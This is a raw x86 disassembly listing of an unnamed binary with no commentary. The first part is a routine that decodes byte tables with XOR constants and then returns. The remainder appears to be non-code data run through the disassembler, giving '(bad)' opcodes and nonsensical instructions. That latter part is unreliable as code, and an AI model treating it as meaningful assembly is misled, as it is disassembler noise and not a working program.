  43ecb7:	mov    edx,DWORD PTR ds:0x44808c
  43ecbd:	movzx  ecx,BYTE PTR [edx+0xf]
  43ecc1:	movzx  edi,BYTE PTR [edx+0xd]
  43ecc5:	shl    ecx,0x8
  43ecc8:	add    ecx,edi
  43ecca:	movzx  edi,BYTE PTR [edx+0xa]
  43ecce:	movzx  edx,BYTE PTR [edx+0x7]
  43ecd2:	shl    ecx,0x8
  43ecd5:	add    ecx,edi
  43ecd7:	shl    ecx,0x8
  43ecda:	add    ecx,edx
  43ecdc:	mov    DWORD PTR ds:0x448d10,ecx
  43ece2:	mov    edx,0x36373be8
  43ece7:	sub    edx,DWORD PTR ds:0x448d1c
  43eced:	xor    edx,ecx
  43ecef:	mov    DWORD PTR [eax+0x4],edx
  43ecf2:	mov    edx,DWORD PTR ds:0x44808c
  43ecf8:	add    edx,0x10
  43ecfb:	mov    DWORD PTR ds:0x44808c,edx
  43ed01:	movzx  ecx,WORD PTR [edx+0x5]
  43ed05:	movzx  edx,WORD PTR [edx+0x2]
  43ed09:	shl    ecx,0x10
  43ed0c:	add    ecx,edx
  43ed0e:	mov    DWORD PTR ds:0x448d10,ecx
  43ed14:	mov    edx,0x36373be8
  43ed19:	sub    edx,DWORD PTR ds:0x448d1c
  43ed1f:	xor    edx,ecx
  43ed21:	mov    DWORD PTR [eax+0x8],edx
  43ed24:	mov    edx,DWORD PTR ds:0x44808c
  43ed2a:	movzx  ecx,BYTE PTR [edx+0xf]
  43ed2e:	movzx  edi,BYTE PTR [edx+0xd]
  43ed32:	shl    ecx,0x8
  43ed35:	add    ecx,edi
  43ed37:	movzx  edi,BYTE PTR [edx+0xa]
  43ed3b:	movzx  edx,BYTE PTR [edx+0x7]
  43ed3f:	shl    ecx,0x8
  43ed42:	add    ecx,edi
  43ed44:	shl    ecx,0x8
  43ed47:	add    ecx,edx
  43ed49:	mov    DWORD PTR ds:0x448d10,ecx
  43ed4f:	mov    edx,0x36373be8
  43ed54:	sub    edx,DWORD PTR ds:0x448d1c
  43ed5a:	xor    edx,ecx
  43ed5c:	mov    DWORD PTR [eax+0xc],edx
  43ed5f:	mov    edx,DWORD PTR ds:0x44808c
  43ed65:	add    edx,0x10
  43ed68:	mov    DWORD PTR ds:0x44808c,edx
  43ed6e:	movzx  ecx,WORD PTR [edx+0x5]
  43ed72:	movzx  edx,WORD PTR [edx+0x2]
  43ed76:	shl    ecx,0x10
  43ed79:	add    ecx,edx
  43ed7b:	mov    DWORD PTR ds:0x448d10,ecx
  43ed81:	mov    edx,0x36373be8
  43ed86:	sub    edx,DWORD PTR ds:0x448d1c
  43ed8c:	xor    edx,ecx
  43ed8e:	mov    DWORD PTR [eax+0x10],edx
  43ed91:	mov    edx,DWORD PTR ds:0x44808c
  43ed97:	movzx  ecx,BYTE PTR [edx+0xf]
  43ed9b:	movzx  edi,BYTE PTR [edx+0xd]
  43ed9f:	shl    ecx,0x8
  43eda2:	add    ecx,edi
  43eda4:	movzx  edi,BYTE PTR [edx+0xa]
  43eda8:	movzx  edx,BYTE PTR [edx+0x7]
  43edac:	shl    ecx,0x8
  43edaf:	add    ecx,edi
  43edb1:	shl    ecx,0x8
  43edb4:	add    ecx,edx
  43edb6:	mov    edx,0x36373be8
  43edbb:	sub    edx,DWORD PTR ds:0x448d1c
  43edc1:	mov    DWORD PTR ds:0x448d10,ecx
  43edc7:	xor    edx,ecx
  43edc9:	mov    DWORD PTR [eax+0x14],edx
  43edcc:	mov    edx,DWORD PTR ds:0x44808c
  43edd2:	add    edx,0x10
  43edd5:	mov    DWORD PTR ds:0x44808c,edx
  43eddb:	movzx  ecx,WORD PTR [edx+0x5]
  43eddf:	movzx  edx,WORD PTR [edx+0x2]
  43ede3:	shl    ecx,0x10
  43ede6:	add    ecx,edx
  43ede8:	mov    DWORD PTR ds:0x448d10,ecx
  43edee:	mov    edx,0x36373be8
  43edf3:	sub    edx,DWORD PTR ds:0x448d1c
  43edf9:	add    eax,0x20
  43edfc:	xor    edx,ecx
  43edfe:	mov    DWORD PTR [eax-0x8],edx
  43ee01:	mov    edx,DWORD PTR ds:0x44808c
  43ee07:	movzx  ecx,BYTE PTR [edx+0xf]
  43ee0b:	movzx  edi,BYTE PTR [edx+0xd]
  43ee0f:	shl    ecx,0x8
  43ee12:	add    ecx,edi
  43ee14:	movzx  edi,BYTE PTR [edx+0xa]
  43ee18:	movzx  edx,BYTE PTR [edx+0x7]
  43ee1c:	shl    ecx,0x8
  43ee1f:	add    ecx,edi
  43ee21:	shl    ecx,0x8
  43ee24:	add    ecx,edx
  43ee26:	mov    edx,0x36373be8
  43ee2b:	sub    edx,DWORD PTR ds:0x448d1c
  43ee31:	mov    DWORD PTR ds:0x448d10,ecx
  43ee37:	xor    edx,ecx
  43ee39:	mov    DWORD PTR [eax-0x4],edx
  43ee3c:	mov    edx,DWORD PTR ds:0x44808c
  43ee42:	add    edx,0x10
  43ee45:	dec    esi
  43ee46:	mov    DWORD PTR ds:0x44808c,edx
  43ee4c:	jne    0x43ec95
  43ee52:	mov    eax,ds:0x448d20
  43ee57:	mov    edx,DWORD PTR ds:0x448090
  43ee5d:	add    eax,0xcdf0
  43ee62:	mov    esi,0x2c
  43ee67:	jmp    0x43ee70
  43ee69:	lea    esp,[esp+0x0]
  43ee70:	movzx  ecx,BYTE PTR [edx+0x7]
  43ee74:	movzx  edi,BYTE PTR [edx+0x4]
  43ee78:	movzx  edx,WORD PTR [edx]
  43ee7b:	shl    ecx,0x8
  43ee7e:	add    ecx,edi
  43ee80:	shl    ecx,0x10
  43ee83:	add    ecx,edx
  43ee85:	mov    DWORD PTR ds:0x448d10,ecx
  43ee8b:	mov    edx,0x31658c68
  43ee90:	sub    edx,DWORD PTR ds:0x448d1c
  43ee96:	xor    edx,ecx
  43ee98:	mov    DWORD PTR [eax],edx
  43ee9a:	mov    edx,DWORD PTR ds:0x448090
  43eea0:	movzx  ecx,BYTE PTR [edx+0xf]
  43eea4:	movzx  edi,WORD PTR [edx+0xc]
  43eea8:	movzx  edx,BYTE PTR [edx+0xa]
  43eeac:	shl    ecx,0x10
  43eeaf:	add    ecx,edi
  43eeb1:	shl    ecx,0x8
  43eeb4:	add    ecx,edx
  43eeb6:	mov    edx,DWORD PTR ds:0x448d1c
  43eebc:	mov    DWORD PTR ds:0x448d10,ecx
  43eec2:	add    edx,0x315d889c
  43eec8:	xor    edx,ecx
  43eeca:	mov    DWORD PTR [eax+0x4],edx
  43eecd:	mov    edx,DWORD PTR ds:0x448090
  43eed3:	add    edx,0x10
  43eed6:	mov    DWORD PTR ds:0x448090,edx
  43eedc:	movzx  ecx,BYTE PTR [edx+0x7]
  43eee0:	movzx  edi,BYTE PTR [edx+0x4]
  43eee4:	movzx  edx,WORD PTR [edx]
  43eee7:	shl    ecx,0x8
  43eeea:	add    ecx,edi
  43eeec:	shl    ecx,0x10
  43eeef:	add    ecx,edx
  43eef1:	mov    DWORD PTR ds:0x448d10,ecx
  43eef7:	mov    edx,0x31658c68
  43eefc:	sub    edx,DWORD PTR ds:0x448d1c
  43ef02:	xor    edx,ecx
  43ef04:	mov    DWORD PTR [eax+0x8],edx
  43ef07:	mov    edx,DWORD PTR ds:0x448090
  43ef0d:	movzx  ecx,BYTE PTR [edx+0xf]
  43ef11:	movzx  edi,WORD PTR [edx+0xc]
  43ef15:	movzx  edx,BYTE PTR [edx+0xa]
  43ef19:	shl    ecx,0x10
  43ef1c:	add    ecx,edi
  43ef1e:	shl    ecx,0x8
  43ef21:	add    ecx,edx
  43ef23:	mov    edx,DWORD PTR ds:0x448d1c
  43ef29:	mov    DWORD PTR ds:0x448d10,ecx
  43ef2f:	add    edx,0x315d889c
  43ef35:	xor    edx,ecx
  43ef37:	mov    DWORD PTR [eax+0xc],edx
  43ef3a:	mov    edx,DWORD PTR ds:0x448090
  43ef40:	add    edx,0x10
  43ef43:	mov    DWORD PTR ds:0x448090,edx
  43ef49:	movzx  ecx,BYTE PTR [edx+0x7]
  43ef4d:	movzx  edi,BYTE PTR [edx+0x4]
  43ef51:	movzx  edx,WORD PTR [edx]
  43ef54:	shl    ecx,0x8
  43ef57:	add    ecx,edi
  43ef59:	shl    ecx,0x10
  43ef5c:	add    ecx,edx
  43ef5e:	mov    DWORD PTR ds:0x448d10,ecx
  43ef64:	mov    edx,0x31658c68
  43ef69:	sub    edx,DWORD PTR ds:0x448d1c
  43ef6f:	xor    edx,ecx
  43ef71:	mov    DWORD PTR [eax+0x10],edx
  43ef74:	mov    edx,DWORD PTR ds:0x448090
  43ef7a:	movzx  ecx,BYTE PTR [edx+0xf]
  43ef7e:	movzx  edi,WORD PTR [edx+0xc]
  43ef82:	movzx  edx,BYTE PTR [edx+0xa]
  43ef86:	shl    ecx,0x10
  43ef89:	add    ecx,edi
  43ef8b:	shl    ecx,0x8
  43ef8e:	add    ecx,edx
  43ef90:	mov    edx,DWORD PTR ds:0x448d1c
  43ef96:	add    edx,0x315d889c
  43ef9c:	xor    edx,ecx
  43ef9e:	mov    DWORD PTR ds:0x448d10,ecx
  43efa4:	mov    DWORD PTR [eax+0x14],edx
  43efa7:	mov    edx,DWORD PTR ds:0x448090
  43efad:	add    edx,0x10
  43efb0:	mov    DWORD PTR ds:0x448090,edx
  43efb6:	movzx  ecx,BYTE PTR [edx+0x7]
  43efba:	movzx  edi,BYTE PTR [edx+0x4]
  43efbe:	movzx  edx,WORD PTR [edx]
  43efc1:	shl    ecx,0x8
  43efc4:	add    ecx,edi
  43efc6:	shl    ecx,0x10
  43efc9:	add    ecx,edx
  43efcb:	mov    DWORD PTR ds:0x448d10,ecx
  43efd1:	mov    edx,0x31658c68
  43efd6:	sub    edx,DWORD PTR ds:0x448d1c
  43efdc:	xor    edx,ecx
  43efde:	mov    DWORD PTR [eax+0x18],edx
  43efe1:	mov    edx,DWORD PTR ds:0x448090
  43efe7:	movzx  ecx,BYTE PTR [edx+0xf]
  43efeb:	movzx  edi,WORD PTR [edx+0xc]
  43efef:	movzx  edx,BYTE PTR [edx+0xa]
  43eff3:	shl    ecx,0x10
  43eff6:	add    ecx,edi
  43eff8:	shl    ecx,0x8
  43effb:	add    ecx,edx
  43effd:	mov    edx,DWORD PTR ds:0x448d1c
  43f003:	mov    DWORD PTR ds:0x448d10,ecx
  43f009:	add    edx,0x315d889c
  43f00f:	xor    edx,ecx
  43f011:	mov    DWORD PTR [eax+0x1c],edx
  43f014:	mov    edx,DWORD PTR ds:0x448090
  43f01a:	add    edx,0x10
  43f01d:	mov    DWORD PTR ds:0x448090,edx
  43f023:	movzx  ecx,BYTE PTR [edx+0x7]
  43f027:	movzx  edi,BYTE PTR [edx+0x4]
  43f02b:	movzx  edx,WORD PTR [edx]
  43f02e:	shl    ecx,0x8
  43f031:	add    ecx,edi
  43f033:	shl    ecx,0x10
  43f036:	add    ecx,edx
  43f038:	mov    DWORD PTR ds:0x448d10,ecx
  43f03e:	mov    edx,0x31658c68
  43f043:	sub    edx,DWORD PTR ds:0x448d1c
  43f049:	xor    edx,ecx
  43f04b:	mov    DWORD PTR [eax+0x20],edx
  43f04e:	mov    edx,DWORD PTR ds:0x448090
  43f054:	movzx  ecx,BYTE PTR [edx+0xf]
  43f058:	movzx  edi,WORD PTR [edx+0xc]
  43f05c:	movzx  edx,BYTE PTR [edx+0xa]
  43f060:	shl    ecx,0x10
  43f063:	add    ecx,edi
  43f065:	shl    ecx,0x8
  43f068:	add    ecx,edx
  43f06a:	mov    edx,DWORD PTR ds:0x448d1c
  43f070:	mov    DWORD PTR ds:0x448d10,ecx
  43f076:	add    edx,0x315d889c
  43f07c:	xor    edx,ecx
  43f07e:	mov    DWORD PTR [eax+0x24],edx
  43f081:	mov    edx,DWORD PTR ds:0x448090
  43f087:	add    edx,0x10
  43f08a:	mov    DWORD PTR ds:0x448090,edx
  43f090:	movzx  ecx,BYTE PTR [edx+0x7]
  43f094:	movzx  edi,BYTE PTR [edx+0x4]
  43f098:	movzx  edx,WORD PTR [edx]
  43f09b:	shl    ecx,0x8
  43f09e:	add    ecx,edi
  43f0a0:	shl    ecx,0x10
  43f0a3:	add    ecx,edx
  43f0a5:	mov    DWORD PTR ds:0x448d10,ecx
  43f0ab:	mov    edx,0x31658c68
  43f0b0:	sub    edx,DWORD PTR ds:0x448d1c
  43f0b6:	xor    edx,ecx
  43f0b8:	mov    DWORD PTR [eax+0x28],edx
  43f0bb:	mov    edx,DWORD PTR ds:0x448090
  43f0c1:	movzx  ecx,BYTE PTR [edx+0xf]
  43f0c5:	movzx  edi,WORD PTR [edx+0xc]
  43f0c9:	movzx  edx,BYTE PTR [edx+0xa]
  43f0cd:	shl    ecx,0x10
  43f0d0:	add    ecx,edi
  43f0d2:	shl    ecx,0x8
  43f0d5:	add    ecx,edx
  43f0d7:	mov    edx,DWORD PTR ds:0x448d1c
  43f0dd:	mov    DWORD PTR ds:0x448d10,ecx
  43f0e3:	add    edx,0x315d889c
  43f0e9:	xor    edx,ecx
  43f0eb:	mov    DWORD PTR [eax+0x2c],edx
  43f0ee:	mov    edx,DWORD PTR ds:0x448090
  43f0f4:	add    edx,0x10
  43f0f7:	add    eax,0x30
  43f0fa:	dec    esi
  43f0fb:	mov    DWORD PTR ds:0x448090,edx
  43f101:	jne    0x43ee70
  43f107:	mov    esi,DWORD PTR ds:0x448d20
  43f10d:	mov    edi,DWORD PTR ds:0x44501c
  43f113:	add    esi,0xd630
  43f119:	mov    ebx,0xbc
  43f11e:	mov    edi,edi
  43f120:	lea    eax,[esp+0x10]
  43f124:	push   eax
  43f125:	push   0x0
  43f127:	push   0x3
  43f129:	call   edi
  43f12b:	mov    ecx,DWORD PTR ds:0x448094
  43f131:	movzx  eax,WORD PTR [ecx+0x7]
  43f135:	movzx  ecx,WORD PTR [ecx+0x4]
  43f139:	shl    eax,0x10
  43f13c:	add    eax,ecx
  43f13e:	mov    ds:0x448d10,eax
  43f143:	mov    edx,0xfc8564bb
  43f148:	sub    edx,DWORD PTR ds:0x448d1c
  43f14e:	xor    edx,eax
  43f150:	mov    DWORD PTR [esi],edx
  43f152:	mov    ecx,DWORD PTR ds:0x448094
  43f158:	movzx  eax,WORD PTR [ecx+0xe]
  43f15c:	movzx  ecx,WORD PTR [ecx+0xb]
  43f160:	mov    edx,DWORD PTR ds:0x448d1c
  43f166:	sub    edx,0x401e6
  43f16c:	shl    eax,0x10
  43f16f:	add    eax,ecx
  43f171:	neg    edx
  43f173:	sbb    edx,edx
  43f175:	and    edx,0x37f7e86
  43f17b:	add    edx,0xfc8162d5
  43f181:	xor    edx,eax
  43f183:	mov    ds:0x448d10,eax
  43f188:	mov    DWORD PTR [esi+0x4],edx
  43f18b:	add    DWORD PTR ds:0x448094,0x10
  43f192:	add    esi,0x8
  43f195:	dec    ebx
  43f196:	jne    0x43f120
  43f198:	pop    edi
  43f199:	pop    ebx
  43f19a:	test   ebp,ebp
  43f19c:	je     0x43f1a5
  43f19e:	push   ebp
  43f19f:	call   DWORD PTR ds:0x44502c
  43f1a5:	pop    esi
  43f1a6:	pop    ebp
  43f1a7:	add    esp,0x11c
  43f1ad:	ret    
  43f1ae:	int3   
  43f1af:	int3   
  43f1b0:	add    BYTE PTR [eax],al
  43f1b2:	nop
  43f1b3:	jmp    esp
  43f1b5:	sbb    DWORD PTR [ebx-0x3700ff17],0xffffffc5
  43f1bc:	push   ebx
  43f1bd:	add    BYTE PTR [eax],al
  43f1bf:	add    bh,bh
  43f1c1:	or     ecx,0x0
  43f1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f1c5:	int3   
  43f1c6:	dec    eax
  43f1c7:	idiv   bh
  43f1c9:	dec    DWORD PTR [ebp+0x17]
  43f1cc:	push   0xff55ff89
  43f1d1:	push   DWORD PTR [ebx+eax*4]
  43f1d4:	adc    al,BYTE PTR [eax]
  43f1d6:	cs fmulp st(4),st
  43f1d9:	call   eax
  43f1db:	and    dl,ch
  43f1dd:	cmp    edi,0x27
  43f1e0:	(bad)  
  43f1e1:	dec    DWORD PTR [esp+ecx*8]
  43f1e4:	and    DWORD PTR [eax],eax
  43f1e6:	push   esp
  43f1e7:	dec    ebp
  43f1e8:	add    bh,bh
  43f1ea:	ret    
  43f1eb:	mov    ds:0xb883ffd9,al
  43f1f0:	inc    DWORD PTR [ebx-0x7c66004c]
  43f1f6:	xchg   edx,eax
  43f1f7:	cmc    
  43f1f8:	(bad)  
  43f1f9:	call   edx
  43f1fb:	sbb    BYTE PTR [eax-0xdff01],ah
  43f201:	mov    DWORD PTR [ebp-0x1],edx
  43f204:	push   esi
  43f205:	mov    DWORD PTR [ebp-0x357cff70],edx
  43f20b:	mov    eax,0x4affff11
  43f210:	add    bh,bh
  43f212:	sbb    eax,0xf5832dff
  43f217:	cmp    DWORD PTR [eax],eax
  43f219:	jmp    FWORD PTR [ecx]
  43f21b:	leave  
  43f21c:	mov    bl,0xcc
  43f21e:	int3   
  43f21f:	pop    ecx
  43f220:	(bad)  
  43f221:	push   DWORD PTR [ecx]
  43f223:	(bad)  
  43f224:	js     0x43f226
  43f226:	in     eax,0xb8
  43f228:	inc    DWORD PTR [eax]
  43f22a:	dec    edi
  43f22b:	push   0xffffff86
  43f22d:	(bad)  
  43f22e:	inc    DWORD PTR [edi-0x1]
  43f231:	int3   
  43f232:	adc    bh,bh
  43f234:	add    eax,0xff2febff
  43f239:	jmp    FWORD PTR [esi]
  43f23b:	aas    
  43f23c:	inc    esp
  43f23d:	(bad)  
  43f23e:	call   DWORD PTR [eax+eax*1]
  43f241:	inc    DWORD PTR [ebx]
  43f243:	and    eax,0xffffff83
  43f246:	mov    edi,0xacffff99
  43f24b:	and    DWORD PTR [edx-0x1],esi
  43f24e:	inc    esi
  43f250:	inc    DWORD PTR [eax]
  43f252:	inc    ecx
  43f253:	(bad)  
  43f254:	out    dx,al
  43f255:	add    BYTE PTR [ebx+edx*2-0x1],dl
  43f259:	call   DWORD PTR [edi-0x767ccee8]
  43f25f:	(bad)  
  43f260:	inc    DWORD PTR [eax]
  43f262:	xlat   BYTE PTR ds:[ebx]
  43f263:	jmp    FWORD PTR [esi+0x0]
  43f266:	xor    al,0x68
  43f268:	add    BYTE PTR [eax],al
  43f26a:	pusha  
  43f26b:	and    al,0x36
  43f26d:	inc    DWORD PTR [eax]
  43f26f:	rol    DWORD PTR [eax],1
  43f271:	call   DWORD PTR [eax+0x78836700]
  43f277:	jmp    0x43f278
  43f279:	jmp    edi
  43f27b:	hlt    
  43f27c:	stos   DWORD PTR es:[edi],eax
  43f27d:	mov    edi,edi
  43f27f:	cmp    edi,0x80ff5000
  43f285:	jmp    FWORD PTR [edi]
  43f287:	add    eax,0x37d8cc00
  43f28c:	adc    cl,ah
  43f28e:	mov    esi,ecx
  43f290:	inc    DWORD PTR [eax]
  43f292:	xor    DWORD PTR [eax],eax
  43f294:	test   BYTE PTR [eax],al
  43f296:	xchg   ecx,eax
  43f297:	mov    eax,ds:0xe7cc83ff
  43f29c:	pop    ebp
  43f29d:	mov    edi,edi
  43f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f2a0:	inc    DWORD PTR [eax]
  43f2a2:	inc    ecx
  43f2a3:	add    BYTE PTR [edi-0x7d],ah
  43f2a6:	xlat   BYTE PTR ds:[ebx]
  43f2a7:	and    eax,DWORD PTR [ebx-0x3a6f6c00]
  43f2ad:	inc    DWORD PTR [ebx+0x5b00fff4]
  43f2b3:	add    BYTE PTR [eax+0x2fe8ff],dl
  43f2b9:	dec    DWORD PTR [edi-0x28]
  43f2bc:	fdiv   st(7),st
  43f2be:	inc    DWORD PTR [ebp-0xed7601]
  43f2c4:	inc    ebx
  43f2c5:	dec    ebp
  43f2c7:	jbe    0x43f2c9
  43f2c9:	push   DWORD PTR [ebx-0x337cea44]
  43f2cf:	sar    edi,1
  43f2d1:	push   ebp
  43f2d3:	call   DWORD PTR [ebp-0x693301]
  43f2d9:	add    BYTE PTR [edi-0x48],bh
  43f2dc:	loop   0x43f2de
  43f2de:	add    bh,bl
  43f2e0:	add    BYTE PTR [eax],al
  43f2e2:	ud0    edx,DWORD PTR [eax+0x521900]
  43f2e9:	jmp    FWORD PTR [ecx+0xc]
  43f2ec:	inc    esi
  43f2ed:	(bad)  
  43f2ee:	call   FWORD PTR [eax]
  43f2f0:	add    ah,cl
  43f2f2:	dec    esp
  43f2f3:	add    BYTE PTR ds:0x530cff,dl
  43f2f9:	cmp    DWORD PTR [edx+eiz*8],0xffffffe9
  43f2fd:	inc    DWORD PTR [ebx-0x320000b5]
  43f303:	call   DWORD PTR [edi+edi*8-0xff4791]
  43f30a:	(bad)  
  43f30b:	imul   ebx,DWORD PTR [edi-0x33100001],0xffffffff
  43f312:	adc    eax,0x5bff59ff
  43f317:	lock add bh,bh
  43f31a:	pushf  
  43f31b:	inc    ebp
  43f31c:	or     esp,0xffff13ff
  43f322:	out    dx,eax
  43f323:	add    BYTE PTR [eax-0x1],al
  43f326:	add    BYTE PTR [ecx],dl
  43f328:	(bad)  
  43f329:	call   FWORD PTR [edx+eax*8-0x1700009b]
  43f330:	add    bh,bh
  43f332:	fmul   st(4),st
  43f334:	fcos   
  43f336:	or     al,BYTE PTR fs:[eax]
  43f339:	push   esi
  43f33b:	and    dh,ch
  43f33d:	add    BYTE PTR [eax],al
  43f33f:	pop    edi
  43f340:	add    DWORD PTR [eax],0x6e
  43f343:	dec    DWORD PTR ds:0xc562ff
  43f349:	add    bl,ah
  43f34b:	jge    0x43f309
  43f34d:	add    DWORD PTR [eax],0xffffffd5
  43f350:	add    bh,bh
  43f352:	push   ebx
  43f353:	inc    DWORD PTR [ecx+0x0]
  43f356:	mov    eax,0x33898351
  43f35b:	xor    DWORD PTR [eax+0x38ffff],eax
  43f361:	add    BYTE PTR [edi+0x358908cc],ah
  43f367:	in     eax,0xff
  43f369:	call   FWORD PTR [esi+0x5c]
  43f36c:	adc    eax,0xff3b00cc
  43f371:	call   DWORD PTR [edx]
  43f373:	add    BYTE PTR [ecx-0x1],ch
  43f376:	imul   ecx,DWORD PTR ds:0x3edeffff,0x3dffcc5e
  43f380:	(bad)  
  43f381:	(bad)  
  43f382:	fld    QWORD PTR [eax]
  43f384:	inc    eax
  43f385:	xor    DWORD PTR [esi-0x61fffff9],0x14
  43f38c:	sbb    edi,edi
  43f38e:	sub    ebx,0xffffff83
  43f391:	add    BYTE PTR [ebx],bh
  43f393:	add    ebx,0xffffffff
  43f396:	jp     0x43f3be
  43f398:	add    ah,cl
  43f39a:	mov    ds:0xffc048,al
  43f39f:	cmc    
  43f3a0:	add    bh,bh
  43f3a2:	fiadd  WORD PTR [ebx+0x62e8000d]
  43f3a8:	inc    DWORD PTR [ebx-0x330e8bd6]
  43f3ae:	(bad)  
  43f3af:	(bad)  
  43f3b1:	dec    ebp
  43f3b3:	add    ch,dh
  43f3b5:	adc    DWORD PTR ds:0x1883831a,0xffffffa5
  43f3bc:	addr16 int3 
  43f3be:	add    ah,al
  43f3c0:	add    BYTE PTR [eax],al
  43f3c2:	jns    0x43f3c4
  43f3c4:	mov    ds:0xffe0bdff,eax
  43f3c9:	(bad)  
  43f3ca:	mov    ebp,0x83608d
  43f3cf:	cmp    edi,edi
  43f3d1:	mov    DWORD PTR [ecx+0x52ff6c00],ebp
  43f3d7:	sub    al,0x0
  43f3d9:	add    BYTE PTR [ecx+0x64],cl
  43f3dc:	out    dx,al
  43f3dd:	add    bh,bh
  43f3df:	adc    eax,0xff2dff00
  43f3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f3e5:	(bad)  
  43f3e6:	cmp    ch,dl
  43f3e8:	inc    DWORD PTR [ebx-0xdddb83]
  43f3ee:	call   DWORD PTR [edx-0x1]
  43f3f1:	add    BYTE PTR [ecx-0x1],bh
  43f3f4:	stos   DWORD PTR es:[edi],eax
  43f3f5:	jmp    FWORD PTR [edi-0x6a]
  43f3f8:	add    BYTE PTR [ecx-0x7c07bf8f],cl
  43f3fe:	sbb    edx,0xffffffff
  43f401:	add    dh,dh
  43f403:	push   DWORD PTR [edi]
  43f405:	push   DWORD PTR [ebp+0x7d8983b5]
  43f40b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f40c:	je     0x43f40d
  43f40e:	jmp    FWORD PTR ds:0x3483cc
  43f414:	dec    ebp
  43f415:	cmp    eax,0xffffffd2
  43f418:	add    bh,bh
  43f41a:	and    eax,0x8300477a
  43f41f:	push   eax
  43f420:	cmp    edi,0x49
  43f423:	mov    DWORD PTR [eax+eax*1-0x7c33a14d],eax
  43f42a:	and    DWORD PTR [ecx+ebx*2],ebx
  43f42d:	int3   
  43f42e:	add    BYTE PTR [eax+eax*1],al
  43f431:	int3   
  43f432:	loope  0x43f400
  43f434:	xor    eax,DWORD PTR [eax]
  43f436:	push   eax
  43f437:	and    eax,DWORD PTR [eax]
  43f439:	mov    DWORD PTR [eax+ebx*8-0x21],edi
  43f43d:	inc    DWORD PTR [eax]
  43f43f:	stc    
  43f440:	inc    DWORD PTR [ebx+0x810034]
  43f446:	jge    0x43f3eb
  43f448:	(bad)  
  43f449:	jmp    DWORD PTR [ebx]
  43f44b:	fsub   st,st(1)
  43f44d:	dec    esp
  43f44f:	jb     0x43f450
  43f451:	add    BYTE PTR [ebx+0x2b8311ff],ch
  43f457:	mov    dh,0xff
  43f459:	mov    DWORD PTR ds:0xffff3ed9,ebx
  43f45f:	out    dx,eax
  43f460:	add    BYTE PTR [ecx-0x7ce20084],cl
  43f466:	jge    0x43f3fd
  43f468:	add    DWORD PTR [eax],0x5e
  43f46b:	jp     0x43f465
  43f46d:	inc    DWORD PTR [eax]
  43f46f:	out    dx,eax
  43f470:	add    bh,bh
  43f472:	stos   DWORD PTR es:[edi],eax
  43f473:	add    BYTE PTR [ebp-0x34],ch
  43f476:	rol    DWORD PTR [eax+eax*1+0x0],cl
  43f47a:	or     bl,BYTE PTR ds:0x83ffbf
  43f480:	inc    DWORD PTR [ebx+0x9cfff4]
  43f486:	sbb    DWORD PTR [edi-0x459eff01],ebp
  43f48c:	(bad)  
  43f48d:	(bad)  
  43f48e:	call   FWORD PTR [ecx]
  43f490:	add    BYTE PTR [ebx-0xfe7ce9],al
  43f496:	jne    0x43f50c
  43f498:	inc    DWORD PTR [eax]
  43f49a:	xlat   BYTE PTR ds:[ebx]
  43f49b:	xchg   BYTE PTR [ebp-0x737601],bl
  43f4a1:	add    bl,dh
  43f4a3:	(bad)  
  43f4a4:	jl     0x43f4a6
  43f4a6:	push   es
  43f4a7:	jb     0x43f4a9
  43f4a9:	dec    ecx
  43f4ab:	stos   DWORD PTR es:[di],eax
  43f4ad:	mov    DWORD PTR [ebx-0x6f000061],eax
  43f4b3:	jmp    FWORD PTR [ebx]
  43f4b5:	jmp    FWORD PTR [ebp-0xd000069]
  43f4bb:	xchg   esi,eax
  43f4bc:	or     eax,0x839900ff
  43f4c1:	int3   
  43f4c2:	pushf  
  43f4c3:	add    al,bl
  43f4c5:	and    DWORD PTR [edi+0x7e],0xffffffff
  43f4c9:	inc    DWORD PTR [edi]
  43f4cb:	shr    DWORD PTR [eax],cl
  43f4cd:	int3   
  43f4ce:	add    bh,dl
  43f4d0:	cmp    edi,0xffffff8b
  43f4d3:	add    BYTE PTR [esi],ah
  43f4d5:	int3   
  43f4d6:	sub    eax,0xe200ff57
  43f4db:	test   BYTE PTR [ecx],dh
  43f4dd:	add    bh,bh
  43f4df:	pop    es
  43f4e0:	(bad)  
  43f4e1:	jmp    ebx
  43f4e3:	(bad)  
  43f4e4:	aas    
  43f4e5:	add    bl,bl
  43f4e7:	push   ds
  43f4e8:	mov    DWORD PTR [eax],eax
  43f4ea:	push   esi
  43f4eb:	mov    bh,0x48
  43f4ed:	add    bh,bh
  43f4ef:	jmp    0x43f474
  43f4f1:	dec    DWORD PTR [ecx+ecx*4-0x7fb0ff79]
  43f4f8:	(bad)  
  43f4f9:	jmp    DWORD PTR [esi-0x59]
  43f4fc:	xor    eax,0xcc6a00ff
  43f501:	int3   
  43f502:	pusha  
  43f503:	add    ch,bh
  43f505:	mov    DWORD PTR [edx],ebx
  43f507:	out    dx,al
  43f508:	inc    DWORD PTR [eax]
  43f50a:	jmp    0x43f549
  43f50c:	adc    edi,edi
  43f50e:	add    ch,ch
  43f510:	add    DWORD PTR [eax],0x44
  43f513:	add    BYTE PTR [ecx-0x1],bl
  43f516:	mov    al,0x4d
  43f518:	(bad)  
  43f519:	call   FWORD PTR [edi-0x7600e07e]
  43f51f:	(bad)  
  43f520:	int3   
  43f521:	int3   
  43f522:	or     al,0xff
  43f524:	loopne 0x43f526
  43f526:	jl     0x43f55a
  43f528:	add    BYTE PTR [ecx+0x6dacb0],cl
  43f52e:	int3   
  43f52f:	sub    eax,DWORD PTR [ebx+0x68839e00]
  43f535:	or     edi,0xffffffcc
  43f538:	(bad)  
  43f539:	dec    DWORD PTR [edi-0x762184]
  43f53f:	into   
  43f540:	add    bh,bh
  43f542:	stos   BYTE PTR es:[edi],al
  43f543:	add    BYTE PTR [edx-0x9bd600],cl
  43f549:	add    BYTE PTR [ebp-0xde8e],ch
  43f54f:	(bad)  
  43f550:	inc    DWORD PTR [eax]
  43f552:	pusha  
  43f553:	inc    DWORD PTR [eax-0x50b34]
  43f559:	dec    DWORD PTR [edx+0x35]
  43f55c:	sub    bh,bh
  43f55e:	(bad)  
  43f55f:	std    
  43f560:	inc    DWORD PTR [eax]
  43f562:	dec    eax
  43f563:	add    dl,bh
  43f565:	jmp    FWORD PTR [ebx]
  43f567:	mov    edi,edi
  43f569:	call   DWORD PTR [ebx-0x17]
  43f56c:	or     BYTE PTR [ecx-0x7c0800],cl
  43f572:	mov    eax,ds:0xe7ff8f00
